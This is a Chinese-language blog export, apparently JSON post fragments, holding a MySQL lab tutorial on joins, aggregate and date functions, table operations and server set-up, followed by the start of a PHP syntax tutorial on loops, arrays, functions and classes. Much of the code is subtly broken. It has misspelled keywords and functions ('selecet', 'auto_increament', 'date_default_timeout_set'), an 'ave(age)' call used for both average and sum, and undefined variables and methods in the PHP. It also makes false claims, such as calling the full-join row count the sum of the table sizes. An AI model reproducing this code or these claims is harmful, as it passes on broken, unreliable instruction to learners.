字符串比较和模式匹配缺省地，MySQL搜索是大小写不敏感的（尽管有一些字符集从来不是忽略大小写的，例如捷克语)。这意味着，如果你用col_name LIKE ‘a%’搜寻，你将得到所有以A或a开始的列值。如果你想要使这个搜索大小写敏感，使用像INDEX(col_name,”A”)=0检查一个前缓。或如果列值必须确切是“A”，使用STRCMP(col_name,”A”)=0。 8.9 大小写敏感比较简单的比较操作(&gt;=、&gt;、=、&lt;、&lt;=、排序和聚合)是基于每个字符的“排序值”。有同样排序值的字符（E，e)被视为相同的字符！LIKE比较在每个字符的大写值上进行(“E”=”e”)。如果你想要一个列总是被当作大小写敏感的方式，声明它为BINARY select &quot;E&quot;=&quot;e&quot;,&quot;E&quot;=binary&quot;e&quot;; 九、检索语句与多个表的连接9.1 创建first表SELECT语句不仅可以从单个表中检索数据，也可以通过连接多个表来检索数据。这里将介绍全连接和左连接的作用。我们创建两个表作为例子 create table first (id tinyint,first_name char(10)); 9.2 录入如下数据insert first values (&#39;1&#39;,&#39;Tom&#39;); insert first values (&#39;2&#39;,&#39;Marry&#39;); insert first values (&#39;2&#39;,&#39;Jarry&#39;); 9.3 查看结果select * from first; 9.4 创建表lastcreate table last (id tinyint,last_name char(10)); 9.5 录入数据insert last values (&#39;2&#39;,&#39;Stone&#39;); insert last values (&#39;3&#39;,&#39;White&#39;); insert last values (&#39;4&#39;,&#39;Donald&#39;); 9.6 查看结果 十、全连接全连接：在检索时指定多个表，将每个表用逗号分隔，这样每个表的数据行都和其他表的每行交叉产生所有可能的组合，这样就是一个全连接。所有可能的组和数即每个表的行数之和。 10.1 观察下面的检索的结果select * from first,last; 你可以看到输出的结果集中共有3×3=9行，这就是全连接的结果 10.2 更换语句select first.*,last.* from first,last; 输出结果与上面的例子相同。记录集的输出的排序是以from子句前的表的顺序进行，既先排列位置靠前的表 10.3 改变记录集中列的显示顺序select last.*,first.* from first,last; 10.4 使用where从句限制返回的记录上面的例子是两个非常小的表的例子，如果是几个非常大的表的全连接，例如，两个行数分别为1000的表，这样的连接可以产生非常大的结果集合1000×1000=100万行。而实际上你并不需要这么多行的结果，通常你需要使用一个where从句来限制返回的记录集的行数 select * from first,last where first.id=last.id; 十一、左连接全连接给出from子句中所有表都有匹配的行。对于左连接，不仅匹配类似前面的行记录，而且还显示左边的表有而右边的表中无匹配的行。对于这样的行，从右边表选择的列均被显示为NULL。这样，每一匹配的行都从左边的表被选出，而如果右边表有一个匹配的行，则被选中，如果不匹配，行仍然被选中，不过，其中右边相应的列在结果集中均设为NULL。即，LEFT JOlN强制包含左边表的每一行，而不管右边表是否匹配 select from table_reference LEFT JOIN table_reference ON conditional_expr 其中table_reference为连接的表，ON子句后接类似where子句的条件 下面我们详细讲述左连接的使用： 11.1 首先，返回一个全连接的结果select * from first,last; 注意上面的结果，下面的例子要与这个例子对照 11.2 给出一个限制条件的查询select * from first,last where first.id = last.id; 11.3 现在我们给出一个真正的左连接的例子你可以仔细观察它的结果，要了解检索的记录顺序 select * from first LEFT JOIN last ON first.id=last.id; 上面的结果，即用左边表的每一行与右边表匹配，如果匹配，则选择到结果集中，如果没有匹配，则结果集中右边表相应的列置为NULL 11.4 进一步理解为了进一步理解这一点，我们给出一个有点奇怪的例子 select * from first LEFT JOIN last ON first.id=1; 因为，在结果的最后两行似乎有你不希望的结果。记住，如果只有ON子句的条件，那么左边表的每一行都会返回，只是如果没有匹配的右边表(虽然本例没有约束右边表的列），则记录集中显示为NULL 11.5 加入where子句前面只是帮助你理解左连接，下面LEFT JOIN的一些有用的技巧。LEFT JOIN最常见的是与WHERE子句共同使用。使用IS NULL或者IS NOT NULL操作符可以筛选NULL或者非NULL值的列，这是最常见的技巧。列如，选出first.id=last.id的组合，并且别除其中没有右表的匹配记录 select * from first LEFT JOIN last ON first.id=last.id where last.id is not NULL; 你可以看到这样子做的例子结果与下列语句输出结果是相同的 select * from first,last where first.id=last.id; 11.6又如，检索id值只在左边表出现，而不在右边表出现的记录 select first.* from first LEFT JOIN last ON first.id=last.id where last.id is NULL; 11.7 全连接和左连接的结果集排列顺序是不同的select * from first,last where first.id != last.id; 11.8select * from first LEFT JOIN last ON first.id != last.id; （四）集合函数【原理】SQL的模式匹配允许你使用“_”匹配任何单个字符，而“%”匹配任何数据字符 【步骤】一、环境构建1.1 启动mysql服务service mysqld restart 1.2 进入mysqlmysql 1.3 创建mytest数据库create database mytest; 1.4 使用mytestuse mytest; 1.5 创建student表，并添加内容create table student (name varchar(10),teacher varchar(10),age int,sex varchar(10),sno varchar(20)); insert into student (name,teacher,age,sex,sno) values (&#39;wanglin&#39;,&#39;jake&#39;,&#39;20&#39;,&#39;woman&#39;,&#39;201902&#39;); insert into student (name,teacher,age,sex,sno) values (&#39;liming&#39;,&#39;tony&#39;,&#39;22&#39;,&#39;man&#39;,&#39;201903&#39;); insert into student (name,teacher,age,sex,sno) values (&#39;fang&#39;,&#39;tony&#39;,&#39;22&#39;,&#39;woman&#39;,&#39;201904&#39;); insert into student (name,teacher,age,sex,sno) values (&#39;limeng&#39;,&#39;benny&#39;,&#39;23&#39;,&#39;women&#39;,&#39;201905&#39;); insert into student (name,teacher,age,sex,sno) values (&#39;liuhu&#39;,&#39;benny&#39;,&#39;23&#39;,&#39;woman&#39;,&#39;201906&#39;); select * from student; 二、行列计数2.1 使用函数count(*)计算查询语句返回的记录行数 select count(*) from student where age=&#39;22&#39;; 三、统计字段值的数目3.1 计算student表中age列的数目select count(age) from student; 3.2 计算age列中特定数字的数目select count(age) from student where age=&#39;20&#39;; 3.3 使用distinct关键字计算不同年龄的学生数目select count(distinct age) from student; 3.4 count()函数配合group by子句select age,count(*) from student group by age; 四、计算字段的平均值4.14.2 计算每个老师带的学生的平均年龄select teacher,ave(age) from student group by teacher; 五、计算字段值的和5.15.2 计算每个老师带的学生年龄的总和select teacher,ave(age) from student group by teacher; 六、计算字段值的极值6.1 MAX()和MIN()求极值select min(age) from student; 6.2 求每个老师所带学生的最小年龄select teacher,min(age) from student group by teacher; 6.3 求每个老师所带学生的最大年龄select teacher,max(age) from student group by teacher; （五）时间函数【原理】（1）日期和时间函数对建立一个站点是非常有用的。站点的主人往往对一个表中的数据何时被更新感兴趣。通过日期和时间函数，你可以在秒级跟踪一个表的改变。（2）日期和时间类型是DATETIME、DATE、TIMESTAIMP、TIHME和YEAR。这些的每一个都有合法值的一个范围，而“零”当你指定确买不合法的值时被使用。 【步骤】一、环境构建1.1 启动mysql服务service mysqld restart 1.2 进入mysqlmysql 1.3 创建mytest数据库create database mytest; 1.4 使用mytestuse mytest; 1.5 创建student表，并添加内容create table student (name varchar(10),teacher varchar(10),age int,sex varchar(10),sno varchar(20)，birth int); insert into student (name,teacher,age,sex,sno,birth) values (&#39;wanglin&#39;,&#39;jake&#39;,&#39;20&#39;,&#39;woman&#39;,&#39;201902&#39;,&#39;19940125&#39;); insert into student (name,teacher,age,sex,sno,birth) values (&#39;liming&#39;,&#39;tony&#39;,&#39;22&#39;,&#39;man&#39;,&#39;201903&#39;,&#39;19910816&#39;); insert into student (name,teacher,age,sex,sno,birth) values (&#39;fang&#39;,&#39;tony&#39;,&#39;22&#39;,&#39;woman&#39;,&#39;201904&#39;,&#39;19921021&#39;); insert into student (name,teacher,age,sex,sno,birth) values (&#39;limeng&#39;,&#39;benny&#39;,&#39;23&#39;,&#39;women&#39;,&#39;201905&#39;,&#39;19951220&#39;); insert into student (name,teacher,age,sex,sno,birth) values (&#39;liuhu&#39;,&#39;benny&#39;,&#39;23&#39;,&#39;woman&#39;,&#39;201906&#39;,&#39;19900202&#39;); select * from student; 二、返回当前日期和时间2.1 curdate()函数，年月日，默认返回’YYYY-MM-DD’格式select curdate(); 2.2 返回’YYYYMMDD’格式select curdate()+0; 2.3 curtime()函数，时分秒，默认返回’HH:MM:SS’格式select curtime(); 2.4 返回’HHMMSS’格式select curtime()+0; 2.5 now()函数，年月日时分秒，默认返回’YYYY-MM-DD HH:MM:SS’select now(); 2.6 返回’YYYYMMDDHHMMSS’select now()+0; 2.7 可用来计算时间差select name,curdate()-birth from student; 三、自动记录数据的改变时间3.1 创建表drop table student; create table student (id int,name char(16),english tinyint,chinese tinyint,history tinyint,time timestamp); 3.2 插入记录insert into student (id,name,english,chinese,history) values (11,&#39;Tom&#39;,66,93,67); 3.3 查看插入的记录selecet * from student; 3.4 更新该记录update student set english=76 where id=11; select * from student; 可以清楚看到，time列的时间被自动更改为修改记录的时间 3.5 不改变其他值的情况下，更改timestampupdate student set time=NULL where id=11; 3.6update student set english=66,time=time where id=11; select * from student where id=11; 3.7四、返回日期和时间范围4.1 创建一个表create table weblog (data float,entrydate datetime); 4.2 随机增加几个数据insert weblog values (rand(),now()); 4.3 上面语句多执行几次，然后添加一个测试值insert weblog values (rand(),&#39;2016-07-19&#39;); 4.4 查看插入的数据select * from weblog; 4.5 查看某天数据——错误示范select * from weblog where entrydate = &#39;2016-07-19&#39;; 4.6 查看某天数据——正确示范方法一select * from weblog where entrydate &gt;= &#39;2019-02-13&#39; and entrydate &lt;= &#39;2019-02-15&#39;; 方法二select * from weblog where entrydate like &#39;2019-02-14%&#39;; 方法三select * from weblog where entrydate &gt;= &#39;2019-02-14&#39;; select * from weblog where entrydate &gt;= &#39;2019.02.14&#39;; select * from weblog where entrydate &gt;= &#39;2019 02 14&#39;; select * from weblog where entrydate &gt;= &#39;20190214&#39;; select * from weblog where entrydate &gt;= &#39;2019/02/14&#39;; 五、比较日期时间5.1 to_days()函数给出一个日期date，返回一个天数(从0年的天数)，date可以是一个数字，也可以是一个串值，当然更可以是包含日期的时间类型 select to_days(960501); select to_days(&#39;1997-07-01&#39;); 5.2 返回2个时间相差的天数select to_days(now())-to_days(&#39;20011010&#39;); （六）数据表操作【原理】（1）MySQL的表的三种类型 （2）如何创建表、删除表 （3）如何改变表的结构、名字 （4）如何使用mysqlshow使用程序 【步骤】一、Mysql数据表的基本操作1.1 启动mysql服务service mysqld restart 1.2 进入mysqlmysql 1.3 用show/descrtbe语句显示数据表show table [from db_name] [like wild] 1.4 列出在一个给定表中的列show columns from tbl_name [from db_name] [like wild] 1.5 列出一个表的索引show index from tbl_name [from db_name] 1.6 列出数据表以及表状态信息show table status [from db_name] [like wild] 1.7 用dscribe查看表的列信息{describe|desc} tbl_name {col_name|wild} 1.8 使用mysqlshow工具得到信息，得到已有数据列的列表先创建用户 mysqladmin -u root password &#39;123456789&#39; 列出某数据库db_name中已有的表： mysqlshow db_name 列出某数据表db_name.tbl_name的结构信息 mysqlshow db_name.tbl_name 列出一张表的索引 mysqlshow -k db_name.tbl_name 1.9 创建mytest和guestbook数据表create database mytest; use mytest; create table guestbook (visitor varchar(40),comment text,entrydate datetime); 1.10 创建test表create table test (b int not null auto_increment,c int,key (b)); 1.11 创建table1在create语句后指定一个select，mysql将为在select中的所有单元创建新字段show columns from test from mytest; create table test1 (a int no null auto_increament,key(a),key(b)) select b,c from test; show columns from test1 from mytest; 1.12 选择一个表的全部内容，拷贝一个表create table test2 select * from test; show columns from test2 from mytest; 1.13 利用一个总是失败的where子句来创建一个空表create table test3 select * from test where 0; 1.14 用alter table语句增加列修改表的结构alter table test add d int; show columns from test from mytest; 1.15 alter改变列语法alter table test modify c char; desc test; 1.16 利用alter更改表名alter table tbl_name rename new_tbl； show tables; 1.17 用drop table语句删除一个或者多个表drop table test1; show tables; 二、向数据表中插入数据2.1 使用insert语句插入新数据，先创建表create table student(name varchar(20) not null,age int not null); 2.2 插入数据insert into student values (&#39;jake&#39;,21); insert into student values (&#39;jake&#39;,22),(&#39;tony&#39;,23); select * from student; 2.3create table number (col1 int,col2 int); insert into number (col1,col2) values (15,col1+2); select * from number; 2.4 使用insert…select语句插入从其他表选择的行create table number2 (col3 int,col4 int); insert into number2 (col3,col4) select col1,col2 from number; select * from number2; 三、查询数据表中的记录3.1 select最简单的检索select * from number; 3.2 查询特定行select * from student where name = &#39;jake&#39;; 3.3 查询特定列select * from student where age = &#39;22&#39;; 3.4 条件查询select * from student where age &gt; &#39;10&#39;; 3.5 组合条件查询select * from student where age &gt; &#39;21&#39; and name = &#39;jake&#39;; 3.6 组合条件查询——orselect * from student where name = &#39;jake&#39; or age &lt; &#39;10&#39;; 3.7 查询排序select * from student order by age; 3.8 查询排序逆序排序select * from student order by age desc; 四、查询分组和行技术4.1 group by语句select * from student group by age; 4.2 count()函数计数非NULL结果select count(*) from student; 4.3 计算age为非空的记录数目select count(age) from student; 4.4 创建一个表并添加内容create table student (name varchar(10),teacher varchar(10),age int,sex varchar(10),sno varchar(20)); insert into student (name,teacher,age,sex,sno) values (&#39;wanglin&#39;,&#39;jake&#39;,&#39;20&#39;,&#39;woman&#39;,&#39;201902&#39;); insert into student (name,teacher,age,sex,sno) values (&#39;liming&#39;,&#39;tony&#39;,&#39;22&#39;,&#39;man&#39;,&#39;201903&#39;); insert into student (name,teacher,age,sex,sno) values (&#39;fang&#39;,&#39;tony&#39;,&#39;22&#39;,&#39;woman&#39;,&#39;201904&#39;); insert into student (name,teacher,age,sex,sno) values (&#39;limeng&#39;,&#39;benny&#39;,&#39;23&#39;,&#39;women&#39;,&#39;201905&#39;); insert into student (name,teacher,age,sex,sno) values (&#39;liuhu&#39;,&#39;benny&#39;,&#39;23&#39;,&#39;woman&#39;,&#39;201906&#39;); insert into student (name,teacher,age,sex,sno) values (&#39;haha&#39;,&#39;benny&#39;,&#39;NULL&#39;,&#39;man&#39;,&#39;201906&#39;); select * from student; 4.5 用update修改记录update students set sex = &#39;man&#39; where name = &#39;wanglin&#39;; 4.6 用delete删除记录delete from students where name = &#39;haha&#39;; select * from students 4.7 清空整个表delete from students; select * from students; （八）数据库连接【原理】（1）建立与中止和服务器的连接 【步骤】一、建立和中止与服务器的连接1.1 启动mysql服务service mysqld restart 1.2 进入mysqlmysql 1.3 直接连接一个数据库mysql mysql 1.4 如果服务器不在本地，需要指定主机名这里没有密码，直接回车 mysql -h localhost -u root -p 1.5 quit可以退出mysql命令行quit 1.6 创建文本，批量操作 1.7 回到命令行，使用刚才创建的文本mysql -u root -p &lt; /etc/simple （九）启动与关闭【原理】（1）客户机使用SQL语句与Mysql服务器通信。为了与MySQL服务器进行通信，必须熟练掌握SQL。例如，在使用诸如MySQL客户机这样的程序时，其功能首先是作为一种发送SQL语句给服务器执行的工具。而且，如果编写使用编程语言所提供的MySQL接口的程序时，也必须熟悉SQL语言，因为需要沟通 【步骤】一、Mysql的启动与终止1.1 启动mysql服务service mysqld start 1.2 查看是否自启动chkconfig --list | grep 1.3 设置成自启动并查看chkconfig mysqld on chkconfig --list | grep mysqld 1.4 此时创建账户密码mysqladmin -u root password &#39;123456789&#39; 1.51.6 输入mysqladmin shutdown出错mysqladmin shutdown 表示需要一个可以正常连接的用户，正确命令：需要输入刚才创建的密码 mysqladmin -u root -p shutdown 1.7 关闭后，连接失败mysql 1.8 先输入su mysql，再输入mysqladmin –help查看帮助su mysql mysqladmin --help （十）安装【实验原理】（1）源代码配置并编译后进行安装，缺省件安装在 “/usr/logcal” 子目录下 目录 目录的内容 bin 客户程序和脚本 include/mysql 包含（头）文件 info info格式的文档 lib/mysql 库文件 libexec mysqld服务器 share/mysql 错误消息文件 sql-bench 基准程序和crash-me测试 var 数据库和日志文件 （2）在一个安装目录内，源代码安装的布局在下列方面不同于二进制安装： mysl服务器被安装在“libexec”目录而不是“bin”目录内 数据目录是“var”而非“data” mysqL_install_db被安装在“/usr/local/bin”目录而非“/usr/local/mysql/scripts”内 头文件和库目录是“include/mysql”和“lib/mysq”而非“include”和“lib” （3）rpm安装本质上也属于二进制分发，因此安装布局同上。将自动安装启动脚本到/etc/rc.local目录中，MySQL随系统的启动而自动启动。对于RPM分发程序、库文件、头文件和配置文件，分别安装Centos标准的目录/usr/bin、/usr/lib/mysql、/usr/include/mysqll/etc/mysql.缺省时，/var/lib/mysql 【步骤】一、通过rpm来进行mysql-server的安装1.1 查看CentOS自带mysql是否以及安装rpm -qa | grep mysql 1.2 安装依赖包通过输入命令安装Mysql相关依赖包及Mysql主程序 1.3 通过rpm命令查看刚才装好的mysql-server版本 （十一）设置与测试【实验原理】（1）为了安全性，你应该避免使用root帐户启动MySQL守护程序，创建一个专门用于启动守护程序的帐户mysql，并且让数据库属于这个帐户 【步骤】一、初始化授权表1.1 初始化账户一旦已经安装了MySQL，便需要初始化授权表即mysqI数据库的初始化过程，因为此时MySQL权限系统需要的数据库和表并不存在。但初始化之前需要首先切换到mysql帐户，否则如果第一次启动服务器是使用的是其他用户，那么数据库文件就为这个用户所有，之后再由用户mysql启动守护程序，就会因为数据库文件权限的问题得到一个错误 1.2 启动服务 1.3 查看是否开机自动启动 1.4 设置开机自动启动 二、测试 2.2 本实验显示如下 2.3 连接测试 2.4 show databases查看安装的数据库 2.5 如果一切正常，说明安装成功 三、Mysql数据库的主要配置文件3.1 查看mysql的主配置文件/etc/my.cnf 3.2 查看mysql数据库的数据库文件存放位置/var/lib/mysql 3.3 此时自己创建一个数据库：students 3.4 再次查看，验证数据库文件存放位置 3.5 mysql数据库的日志输出存放位置/var/log 四、更改root用户的密码4.1初始化授权表之后，最重要的工作是更改数据库服务器root用户的密码，这对于数据库系统的安全性非常重要，因为root用户是数据库的主宰，拥有不受限制的权限，root用户的密码失窃，就意味着MySQL不再属于你了。更改管理员的密码，初始化授权表之后，root用户是没有密码的，这对安全有毁灭性的影响。你可以运行mysqladmin（请注意，此命令不一定在你的path中，所以最好是转到此命令的目录中直接执行） 【思考】Mysqladmin是哪个模式下的命令？在你的path中，也可以是转到此命令的目录中直接执行","categories":[],"tags":[{"name":"基础知识点","slug":"基础知识点","permalink":"https://knlvre.github.io/tags/基础知识点/"}],"author":"Knlvre"},{"title":"PHP语法","slug":"PHP语法","date":"2019-03-12T16:00:00.000Z","updated":"2019-07-29T09:03:34.953Z","comments":true,"path":"2019/03/13/PHP语法/","link":"","permalink":"https://knlvre.github.io/2019/03/13/PHP语法/","excerpt":"","text":"（一）while循环【原理】（1）while循环 ​ while(条件为真){ ​ 要执行的代码； ​ } （2）Do…while循环 ​ do{ ​ 要执行的代码； ​ }while(条件为真) 【步骤】一、while循环 1.1 while循环测试 只要指定条件为真，则一直循环。在浏览器地址栏中输入“http://localhost/php/ceshi.html&quot;，在文本框中写入程序代码，然后单击”提交”按钮 &lt;?php $i = 0; while($i &lt; 10){ $i++; echo $i.&quot;&lt;/br&gt;&quot;; } ?&gt; 1.2 查看返回结果 提交后，浏览器返回结果，可见while循环一直运行，直到条件不再为真 二、Do…while循环 2.1 编写代码 &lt;?php $i = 0; do{ $i++; echo $i.&quot;&lt;/br&gt;&quot;; } while($i &lt; 10); ?&gt; 2.2 查看返回结果 （二）结构嵌套【原理】（1）当处理一些数据，单一性的判断或循环无法完成时，就开始通过嵌套的形式来提高效率。条件里面套条件，循环里面扣循环。（2）Foreach遍历数组中的每个元素并循环代码块，每进行一次循环迭代，当前数组元索的值就会被赋值给$value变量，并且数组指针会逐一地移动，直到到达最后一个数组元素 foreach (Sarray as Svalue) { code to be executed; } 【步骤】一、结构嵌套 1.1 输入代码 &lt;?php //创建一个奥运会数组 $Olympic = array( &#39;2012&#39; =&gt; &quot;英国 伦敦&quot;, &#39;2008&#39; =&gt; &quot;中国 北京&quot;, &#39;2004&#39; =&gt; &quot;希腊 雅典&quot;, &#39;2000&#39; =&gt; &quot;澳大利亚 悉尼&quot;, &#39;1996&#39; =&gt; &quot;美国 亚特兰大&quot;, &#39;1992&#39; =&gt; &quot;西班牙 巴塞罗那&quot;, &#39;1988&#39; =&gt; &quot;韩国 汉城&quot;, &#39;1984&#39; =&gt; &quot;美国 洛杉矶&quot;, &#39;1980&#39; =&gt; &quot;苏联 莫斯科&quot;, &#39;1976&#39; =&gt; &quot;加拿大 蒙特利尔&quot;, ); function Sj($Sj){ global $Olympic; //将数组设为全局变量 foreach ($Olympic as $key =&gt; $value){ //取出数组中的key值，并与所提交的时间做判断 if ($Sj == $key){ echo $Sj.&quot;年，奥运会在 【&quot;.$values&quot;】 举行。&lt;/br&gt;&quot;; } } } Sj(1996); Sj(2008); ?&gt; 1.2 查看返回结果 （三）数组【原理】（1）数组，是相同数据类型的元素按一定顺序排列的集合。若将有限个类型相同的变量的集合命名，那么这个名称为数组名。组成数组的各个变量称为数组的分量，也称为数组的元素，有时也称为下标变量。用于区分数组的各个元素的数字编号称为下标。数组是在程序设计中，为了处理方便，把具有相同类型的若干变量按有序的形式组织起来的一种形式。这些按序排列的同类数据元素的集合称为数组。（3）array()函数用于创建数组（3）print_r()函数用于打印数组 【步骤】一、索引数组 1.1 输入代码 &lt;?php //第一种，自动创建索引 $a = array(&#39;1&#39;,&#39;2&#39;,&#39;3&#39;); //第二种 $b[0] = &#39;1&#39;; $b[1] = &#39;2&#39;; $b[2] = &#39;3&#39;; echo &quot;第一种显示为：&lt;/br&gt;&quot;; print_r($a); echo &quot;&lt;/br&gt;&quot;; echo &quot;第二种显示为：&lt;/br&gt;&quot;; print_r($b).&quot;&lt;/br&gt;&quot;; ?&gt; 1.2 查看返回结果 二、关联数组 2.1 输入代码 关联数组的创建与索引数组创建相似 &lt;?php //第一种 $a = array(&quot;A&quot; =&gt; &quot;19&quot;,&quot;B&quot; =&gt; &quot;14&quot;,&quot;C&quot; =&gt; &quot;11&quot;); //第二种 $b[&quot;A&quot;] = &quot;19&quot;; $b[&quot;B&quot;] = &quot;14&quot;; $b[&quot;C&quot;] = &quot;11&quot;; echo &quot;第一种显示为：&lt;/br&gt;&quot;; print_r($a); echo &quot;&lt;/br&gt;&quot;; echo &quot;第二种显示为：&lt;/br&gt;&quot;; print_r($b).&quot;&lt;/br&gt;&quot;; ?&gt; 2.2 查看返回的结果 三、多维数组 多维数组：包含一个或多个数组的数组（初级了解） 四、数组调用 4.1 编写代码 数组元素的一般形式为：数组名[下标]，其中的下标只适为整型常量或整型表达式数组元素通常也称为下标变量。必须先定义数组，才能使用下标变量。在文本输入框中写入程序代码，然后单击“提交”按钮 &lt;?php //数据创建 $a = array(&quot;A&quot; =&gt; &quot;19&quot;,&quot;B&quot; =&gt; &quot;14&quot;,&quot;C&quot; =&gt; &quot;11&quot;); //调用 echo $a[&quot;A&quot;].&quot;&lt;/br&gt;&quot;; echo $a[&quot;B&quot;].&quot;&lt;/br&gt;&quot;; echo $a[&quot;C&quot;].&quot;&lt;/br&gt;&quot;; ?&gt; 4.2 浏览返回结果 （四）内建函数【原理】（1）PHP自带函数 例如 print_r() //打印数组 var_dump() //打印数据类型 strlen() 计算字符串长度 【步骤】一、内建函数 1.1 输入代码 MD5()是常见的一种加密方式。strlen()函数则是用来计算字符串长度 &lt;?php //PHP内建函数 //像我们以前用过的 //print_r() 打印数组 //var_dump() 打印数据类型 //MD5() 将内容进行md5加密 $a = &quot;sdhflshjfl&quot;; echo &quot;变量a经过MD5()加密后输出：&lt;/br&gt;&quot;.md5($a).&quot;&lt;/br&gt;&quot;; //strlen() 用于计算字符串的长度 $b = &quot;a3bcds&quot;; echo &quot;变量b的字符长度为：&lt;/br&gt;&quot;.strlen($b).&quot;&lt;/br&gt;&quot;; //内建函数许多，就不一一举例 ?&gt; 1.2 查看返回结果 （五） 自定义函数【原理】自定义函数以“function”开头： function functionName){ 被执行的代码；}如果需要函数返回值，使用return语句($value改成你要使用的变量）例：function functionName(){ 被执行的代码； return $value;}可以通过答数向的数传递信息，参数类似变量。参数被定义在函数名之后，括号内部。多参故，只要用适号隔开即可 【步骤】一、自定义函数 1.1 输入代码 &lt;?php //创建一个名为Student的函数，两个参数分别为name,achievement function Student($name,$achievement){ if ($achievement &gt;= 80){ echo $name.&quot;考了&quot;.$achievement.&quot;分，可以过个好年了！！！&lt;/br&gt;&quot;; }else{ echo $name.&quot;考了&quot;.$achievement.&quot;分，不知道回家会不会挨打啊！！！&lt;/br&gt;&quot;; } } Student(&quot;小敏&quot;,80); Student(&quot;小娟&quot;,50); Student(&quot;小杨&quot;,75); Student(&quot;小明&quot;,99); ?&gt; 1.2 查看返回结果 （六）日期【原理】（1）date()函数用于对日期或时间进行格式化 （2）date_default_timezone_set(“PRC”)设置时间区 【步骤】一、日期 由于PHP获取的时间默认认为格林威治标准时间，可自己设置默认时间区 &lt;?php date_default_timeout_set(&#39;PRC&#39;); //设置中国时区 echo &quot;今天是&quot;.date(&quot;Y-m-d&quot;).&quot;现在时间是&quot;.date(&quot;h:i:sa&quot;).&quot;&lt;/br&gt;&quot;; //strtotime()用来创建日期，不过不完美 $d1 = strtotime(&quot;December 31&quot;); $d2 = ceil(($d1-time())/60/60/24); echo &quot;距离十二月三十一日还有：&quot;.$d2.&quot;天。&quot;; //输出周六的日期 $startdate = strtotime(&quot;Saturday&quot;); $enddate = strtotime(&quot;+6 weeks&quot;,$startdate); while($startdate &lt; $enddate){ echo date(&quot;M d&quot;,$startdate).&quot;&lt;/br&gt;&quot;; $startdate = strtotime(&quot;+1 week&quot;,$startdate); } ?&gt; 二、查看结果 （七）类的属性及定义方法【原理】（1）类的变量成员叫做“属性”。属性声明是由关键字public / protected / private开头，然后跟一个变量来组成（2）在类的成员方法里面，可以通过$this-&gt;property(property是属性名字）这种方式来访问类的属性、方法，但是要访问类的静态属性或者在静态方法里面却不能使用，而是使用self::Sproperty(初级了解)（2）定界符：PHP定界符的作用就是按照原样，包括换行格式什么的，输出在其内部的东西；在PHP定界符中的任何特殊字符都不需要转义；PHP定界符中的PHP变量会被正常的用其值来替换 【步骤】一、类的属性及定义方法（public为例） 1.1 输入代码 &lt;?php //创建一个Student类 class Student{ //属性声明为共有的 public $a = &quot;sdfa&quot;; public $b = array(&quot;a&quot;,&quot;b&quot;,3); //PHP定界符，这里AAA为定界标识符，里面的内容全部输出 public $c =&lt;&lt;&lt;AAA hello world AAA; //结束标识符，行首写且单占一行除了后面跟;结尾 } $A = new Student(); print_r($A -&gt; b); echo &quot;&lt;/br&quot;&gt;; echo $A -&gt; a.&quot;&lt;/br&gt;&quot;.$A -&gt; c; //这里只做public访问。private/protected会在后面 访问控制 中说明 ?&gt; 二、查看返回结果 （八）构造函数及析构函数【原理】（1）__construct()构造函数，用来初始化对象 （2）__destruct()析构函数，释放所暂用的内存 【步骤】一、构造函数及析构函数 1.1 输入代码 &lt;?php class Car{ function __construct(){ print &quot;构造函数被调用 &lt;/br&gt;&quot;; } function __destruct(){ print &quot;析构函数被调用 &lt;/br&gt;&quot;; } } $car = new Car(); //实例化时会调用构造函数 echo &quot;使用后，准备销毁car对象.&lt;/br&gt;&quot;; unset($car); //摧毁时会调用析构函数 echo &quot;----------分割线----------&lt;/br&gt;&quot;; $car = new Car(); //实例化的时候会自动调用构造函数__construct，这里会输出一个字符串 ?&gt; 1.2 查看返回结果 （九）访问控制【原理】对属性或方法的访问控制，是通过在前面添加关键字public、protected或private来实现的。由public所定义的类成员可以在任何地方被访问；由protected所定义的类成员则可以被其所在类的子类和父类访问（当然，该成员所在的类也可以访问）；而由private定义的类成员则只能被其所在类访问 【步骤】一、访问控制 1.1 输入代码 &lt;?php class Student{ //声明私有属性 private $name; private $age; private $sex; //构建函数 function __construct($name,$age,$sex){ $this -&gt; name = $name; $this -&gt; age = $age; $this -&gt; sex = $sex; } //对象无法直接访问私有属性，但通过魔术方法可以改变这点 __get() __set() function __get($proName){ return $this -&gt; $proName; } function __set($proName,$proValue){ $this -&gt; $proName $proValue; } //通过函数访问私有属性 function say(){ return &quot;我叫：$this -&gt; name 年龄：$this -&gt; age 性别：$this -&gt; sex&quot;; } //析构函数用来释放内存 function __destruct(){ echo &quot;&lt;/br&gt;运行结束，释放内存&lt;/br&gt;&quot;; } } $A = new Student(&quot;素白&quot;，22，&quot;男&quot;); //创建对象 echo $A -&gt; name.&quot;&lt;/br&gt;&quot;; echo $A -&gt; say(); ?&gt; 1.2 查看返回结果 （十）继承【原理】子类继承父类的所有公有和保护方法。但是子类的方法会覆盖父类的方法 【步骤】一、继承 1.1 输入代码 &lt;?php //创建父类 Person class Person{ function read($name){ echo &quot;【&quot;.$name.&quot;】喜欢三毛的作品。&lt;/br&gt;&quot;; } function doing($name){ echo &quot;【&quot;.$name.&quot;】 喜欢打篮球&lt;/br&gt;&quot;; } } //创建Person的子类Student class Student extends Person{ function eat($name){ echo &quot;【&quot;.$name.&quot;】 喜欢吃甜食&lt;/br&gt;&quot;; } function doing($name){ echo &quot;【&quot;.$name.&quot;】 喜欢打游戏&lt;/br&gt;&quot;; } } $a = new Person(); //创建父类对象 $b = new Student(); //创建子类对象 $b -&gt; read(&quot;素白&quot;); //子类对象调用父类对象中的方法 $b -&gt; eat(&quot;素白&quot;); //子类对象调用自己的方法 echo &quot;----------分隔符----------&lt;/br&gt;&quot;; $a -&gt; doing(&quot;素白&quot;); //父类对象调用自己的方法 $b -&gt; ding(&quot;素白&quot;); //子类对象调用父类对象的同名方法，与父类自掉形成对比 ?&gt; 1.2 查看结果 （十一）条件结构【原理】（1）if语句：条件为真，则执行代码 （2）if….else语句：如果条件为真，则执行代码；否则，则执行另一端代码 （3）if…elseif…else：多条件判断，符合则执行 （4）Switch：多个代码块之一执行，如果没有case为真，则使用default语句 【步骤】一、If语句 1.1 输入代码 &lt;?php $a = 1; if ($a == 1){ echo &quot;a=1&quot;; } if ($a == 2){ echo &quot;a=2&quot;; } ?&gt; 1.2 查看结果 二、If…else语句 2.1 输入代码 &lt;?php $a = 1; if ($a == 1){ echo &quot;a=1&quot;; } echo &quot;&lt;/br&gt;----------分割线---------&lt;/br&gt;&quot;; if ($a == 2){ echo &quot;a=2&quot;; }else{ echo &quot;a不等于2&quot;; } ?&gt; 2.2 查看结果 三、if…elseif…else 3.1 输入代码 &lt;?php function Student($name,$achievement){ if(achievement &gt;= 90){ echo 